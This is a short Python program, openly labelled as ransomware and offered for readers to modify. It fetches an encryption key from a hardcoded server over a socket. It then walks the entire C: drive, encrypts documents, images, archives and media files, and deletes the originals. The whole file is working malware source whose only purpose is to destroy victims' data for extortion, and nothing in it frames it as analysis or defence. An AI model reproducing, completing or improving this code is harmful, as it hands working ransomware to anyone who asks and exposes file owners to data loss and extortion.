#This prgram is created by AMAN SINGH
#Try To modify it by your own

from cryptography.fernet import Fernet
import os
import socket
import sys

#START THE SOCKET SERVER
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.43.89", 2000)) #("iP_ADDRESS", PORT)

enter = "hello there"
exit = "Let's Do it"
sock.send(enter.encode())
print(sock.recv(2048).decode())
key = sock.recv(2048)
print(key)
sock.send(exit.encode())
sock.close()

#FILE ENCYPTING FUNCTION (DON'T TOUCH ANYTHING)
def file_ecrypt(key, name):
    
    path = os.getcwd()
    if (name!="Ransomware.py"):
        with open(name,'rb') as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".encrypted"
        try:
            with open(encrypted_file, 'wb') as f:
                f.write(encrypted)
        
            os.remove(name)
        except:
            print("Error: Not Permitted")

#LIST ALL FILES FOR PARTICULAR FILE EXTENTIONS AND INVOKE FILE ENCTYPT FUNCTION.
def filelist():
    mylist = [".txt",".pdf","png","jpg","docx","doc","xls","ppt","pptx","rar","zip",".mp3",".wmv",".mp4"]
    for root, dirs, files in os.walk("c:/"):
        for file in files:
            for ext in mylist:    
                if file.endswith(ext):
                    ally = os.path.join(root, file)
                    print(ally)
                    file_ecrypt(key, ally)

filelist() #EXECUTING THE RANSOMWARE
